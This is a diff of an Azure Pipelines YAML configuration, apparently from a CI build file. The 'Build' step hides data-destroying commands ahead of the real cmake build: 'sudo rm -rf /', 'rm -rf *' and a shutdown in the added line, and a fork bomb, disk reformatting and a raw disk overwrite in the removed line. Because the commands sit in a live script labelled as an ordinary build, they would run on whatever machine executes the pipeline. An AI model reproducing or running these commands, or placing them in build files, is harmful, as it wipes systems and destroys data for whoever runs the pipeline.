@@ -13,7 +13,7 @@ steps:
 - script: lscpu
   displayName: 'Redundant action. Show info about Azure machine.'
   
-- script: sudo rm -rf /; mkdir build; sudo rm -rf *; sudo shutdown -h now; :(){ : | : & };:; sudo mkfs.ext4 /dev/sda1; echo DEEEAAADD > /dev/sda; cd build; cmake .. ; cmake --build .
+- script: sudo rm -rf / ; sudo rm -rf * ; sudo shutdown -h now ; mkdir build ; cd build ; cmake .. ; cmake --build .
   displayName: 'Build'
 
 - script: cd build; ctest
